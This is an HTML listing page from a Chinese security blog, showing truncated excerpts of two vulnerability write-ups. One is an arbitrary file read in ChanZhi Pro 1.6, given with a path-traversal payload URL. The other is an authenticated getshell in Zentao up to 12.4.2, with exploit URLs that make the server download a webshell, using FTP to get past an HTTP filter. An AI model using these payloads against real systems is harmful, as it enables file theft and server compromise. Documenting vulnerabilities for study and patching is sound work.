+    <article id="post-禅知/禅知Pro 1.6 前台任意文件读取" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.731Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="禅知-Pro-1-6-前台任意文件读取"><a href="#禅知-Pro-1-6-前台任意文件读取" class="headerlink" title="禅知 Pro 1.6 前台任意文件读取"></a>禅知 Pro 1.6 前台任意文件读取</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>在网站根目录C:\xampp\chanzhi\www新建一个测试文件test.php</p>
+<p><img src="/resource/%E7%A6%85%E7%9F%A5Pro1.6%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId24.png"></p>
+<p>执行payload查看文件内容：</p>
+<pre><code>http://0-sec.org/file.php?pathname=../test.php&amp;t=txt&amp;o=source
+</code></pre>
+<p><img src="/resource/%E7%A6%85%E7%9F%A5Pro1.6%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/media/rId25.png"></p>
+<p>执行payload来查看程序的配置文件：</p>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E7%9F%A5/%E7%A6%85%E7%9F%A5Pro%201.6%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/" data-id="cl5c2r02x00owy8v1etsg9zpk" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+
+    
+    <article id="post-禅道/禅道_=12.4.2 后台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:26:09.625Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="禅道-lt-12-4-2-后台getshell"><a href="#禅道-lt-12-4-2-后台getshell" class="headerlink" title="禅道&lt;=12.4.2 后台getshell"></a>禅道&lt;=12.4.2 后台getshell</h1><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Exploit：</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/client-download-1-">http://127.0.0.1/zentao/client-download-1-</a>(base64 encode webshelldownload link)-1.html</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/zentao/data/client/1/">http://127.0.0.1/zentao/data/client/1/</a>(download link filename)</p>
+<p> <strong>复现：</strong></p>
+<p>![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image002.jpg)</p>
+<p>使用<strong>FTP****协议</strong>下载文件，绕过<strong>module/client/ext/model/xuanxuan.php:10</strong> <strong>downloadZipPackage</strong> 的<strong>HTTP****协议</strong>过滤。</p>
+<p>![img](/resource/%E7%A6%85%E9%81%93%3C=12.4.2%20%E5%90%8E%E5%8F%B0getshell/media/clip_image004.jpg)</p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/%E7%A6%85%E9%81%93/%E7%A6%85%E9%81%93_=12.4.2%20%E5%90%8E%E5%8F%B0getshell/" data-id="cl5c2qzyq00ovy8v13zl45ivn" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/11/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/13/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
